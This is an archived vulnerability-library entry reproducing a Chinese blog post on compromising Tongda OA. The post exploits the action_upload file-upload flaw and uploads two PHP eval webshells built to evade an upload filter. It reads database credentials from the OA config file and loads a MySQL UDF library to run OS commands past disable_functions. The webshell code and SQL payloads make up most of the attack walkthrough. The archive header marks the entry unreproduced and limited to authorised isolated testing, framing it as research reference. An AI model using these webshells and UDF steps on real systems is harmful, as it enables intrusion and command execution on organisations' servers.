---
source: "gelusus/wxvl 公众号漏洞文库"
title: "通达OA action_upload后续MySQL UDF案例"
product: "通达OA"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "OA/PHP/MySQL精确版本缺失；Windows/plugin可写"
prerequisites: "已有上传能力及高权限DB凭据"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行；命令/代码执行示例可能改变主机状态"
review_date: "2026-10-02"
source_status: "unknown"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E9%80%9A%E8%BE%BEOA/%E6%A1%88%E4%BE%8B%20%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%2BUdf%E7%BB%95%E8%BF%87RCE%E7%9A%84%E6%95%85%E4%BA%8B.md"
category_recommendation: "OA / 通达"
id: "vw-13376c979d4f191d9afa25e5"
entity_id: "ve-13376c979d4f191d9afa25e5"
schema_version: "1"
---

# 通达OA action_upload后续MySQL UDF案例

## 条目说明

- 对象与具体问题：通达OA；action_upload后续MySQL UDF案例
- 版本、配置及部署条件：OA/PHP/MySQL精确版本缺失；Windows/plugin可写
- 认证与权限前提：已有上传能力及高权限DB凭据
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 不是2026新漏洞；上传原始请求和过滤证据仅截图
- UDF路径应依据plugin_dir与架构，版本5.1至5.1.4描述空档
- PHP代码执行与OS命令执行混称；无UDF/动态库清理说明
- 缺原文URL及最低DB权限说明

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行；命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

原创 d0n9x1e  蝉SEC   2026-01-12 09:38  
  
RCE过的朋友都知道，通达OA在传马之后，常常出现disable_function限制我们无法顺利命令执行的问题，今日分享主题：  
  
1，通达OA任意文件上传的绕过方案  
  
2，  
通达OA-RCE无法执行命令的解决  
  
![](../../.resource/remote/17ffdbc0e250ef688854641830b10f98de802ef13b9ce74ec95258b9eeccd76f.png "")  
  
问题一：  
  
通过扫描，发现该站点存在tongda-oa-action-upload-php-upload，随后，你像疯了一样进行验证，  
发现确实存在  
  
![](../../.resource/remote/41ef3429dd13dd2dc1cc4322f0b482cf4e8f32c5485ba099e6f2fbbb9a018df1.png "")  
  
聪明的你就想传木马了，于是你先传了一个system函数，想执行命令，但是，你发现了一个问题，没办法执行  
  
![](../../.resource/remote/c30ee6c871db7004220a92ff3017acb5e1cfbfa5de5cbd4225085c15e8ff4e45.png "")  
  
  
随后，你从裤裆掏出你的eval函数，单独执行  
  
![](../../.resource/remote/194c0e900642359d31025cabe36f95ba5e1cd4e47e256541d425b728a80b00e6.png "")  
  
  
你发现你的eval函数是可以执行的，你欣喜若狂，就当你上传木马的时候  
  
![](../../.resource/remote/cd72b7d2d511df7cf022dd37a03fbec931ab19845046bf1e38b33bc154efb037.png "")  
  
现实再次给你当头一棒，无法上传  
  
![](../../.resource/remote/442aff73e451167e2aa452904cf735e2ca1556a34dc57262b3ade4c16fbe1443.png "")  
  
你本着遇到问题解决问题的想法，去尝试分析，是什么东西被过滤了，经过你的尝试，你发现了原来是对‘$_POST['x']’格式进行检测  
  
![](../../.resource/remote/afebab2b6ae86d448a22bd6b7364a9495f084368ac629ea6c9798f7b6e72a680.png "")  
  
  
常规的加号无法绕过，这个时候，你想起了你曾经打CTF的时候学习的无参RCE和参数覆盖，随后你制作了如下木马，成功上传；  
  
无参RCE在之前发过相关文章  
```
<?php eval(reset(array_reverse(current(get_defined_vars()))));?>
```  
  
![](../../.resource/remote/92a40db23adbadf57d23295555e741200a58ab141cb65362650a210d686a0072.png "")  
  
变量覆盖如下：  
```
<?php 
extract($_POST);
eval($s);
?>
```  
  
![](../../.resource/remote/22801f827b8f8f95548bb0ed1a0b0859c8ad9f0e5ffc49691ca41ce8515aa214.png "")  
  
这样我们就绕过了对$_POST['x']格式的检测  
  
使用蚁剑成功连接  
  
![](../../.resource/remote/876a589b84037ce9ba058730fd2c3ea21a8c97eda811f1b73a8c56729cc45e9c.png "")  
  
![](../../.resource/remote/234d0f9108494f32bab9c295af88fcbaa11eaeb0eda421b69d8b3360a155e538.png "")  
  
到这里我们第一个问题解决了，大家有任何疑问可直接评论区留言！  
  
问题二：  
  
连接上之后，我们发现命令无法执行，还是disable_function搞的鬼  
  
这里我们就介绍第二个思路  
  
udf方式绕过disable_function  
  
（1）获取udf.dll文件  
  
直接使用metasploit里面的dll脚本  
  
位置如下：  
```
/usr/share/metasploit-framework/data/exploits/mysql
```  
  
![](../../.resource/remote/ff586a25479d68fb1ccf04d0b5ad430f59a110057c1453d819b0723e7b909c10.png "")  
  
连接OA的数据库，数据库账号密码地址如下：  
```
E:/MYOA/webroot/inc/oa_config.php
```  
  
![](../../.resource/remote/92a1d51673b50403102580480b38a64c9290e651be4111f246ab6953684bc9a7.png "")  
  
这里注意，无法进行端口转发，但蚁剑有数据库连接功能，这里使用蚁剑进行数据库连接  
  
![](../../.resource/remote/29ec35157e281f04746aade597f8e03731aad2a4b5ba1cb34f8c2849bb145db1.png "")  
  
下面将我们刚刚的udf进行上传，这里有一点需要注意就是上传位置  
  
如果版本号大于5.1.4 上传udf的位置应该放在 mysql\lib\plugin目录下  
  
如果版本小于5.1 上传udf的位置应该放在c盘的windows或者windows32目录里  
  
![](../../.resource/remote/78211a2b7cff3dba2bfa3a1f75c6368a313ca2d4226e9c3c3b9e2e5cd0d03aac.png "")  
  
下面进行udf利用  
```
create function sys_exec RETURNS int soname 'mysqludf.dll';
create function sys_eval returns string soname 'mysqludf.dll';
select sys_eval("whoami");
```  
  
![](../../.resource/remote/c58d964549c89e4638c1b1ea985efa70e45113f52a8c7139a3570326f4520118.png "")  
  
![](../../.resource/remote/d828a63fc9c742bd13706f361c0c38088e0bacb5715ae953bedbfd3e77c4f9e5.png "")  
  
到这里利用了udf的方式绕过了其对disable_function的限制进行命令执行  
  
欢迎大家一起指点讨论！！！  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
